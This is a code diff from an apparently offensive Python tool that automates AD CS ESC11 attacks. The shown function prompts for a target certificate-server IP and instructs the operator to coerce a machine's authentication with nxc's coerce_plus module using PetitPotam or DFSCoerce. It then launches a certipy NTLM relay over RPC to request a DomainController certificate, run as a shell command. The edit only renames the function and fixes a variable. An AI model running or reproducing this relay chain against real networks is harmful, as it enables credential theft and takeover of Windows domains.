@@ -841,14 +841,14 @@ def run_esc10_2():
     print(f"{msg} {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
-def esc11(ca):
+def run_esc11(ca):
     print(f"{red}[!] Running certipy as sudo -E user due to relay listening{reset}")
     target_ip = input(f"{cyan}[?] ADCS Endpoint IP (target that has http://xxx.xxx.xxx.xxx/certsrv/certnsh.asp): {reset}")
     
     print(f"""{red}[!] You need to do the following in another shell:
         nxc smb <machine to coerce> -M coerce_plus -o LISTENER=<lhost> -o ALWAYS=True -o METHOD=<one of the following PetitPotam, DFSCoerce...""")
     
-    relay_cmd = f"sudo -E python3 certipy relay -target rpc://{target_ip} -template DomainController -ca {ca_name} -template DomainController"
+    relay_cmd = f"sudo -E certipy relay -target rpc://{target_ip} -template DomainController -ca {ca} -template DomainController"
     print(f"{msg}{relay_cmd}{reset}")
     subprocess.call(relay_cmd, shell=True)
 
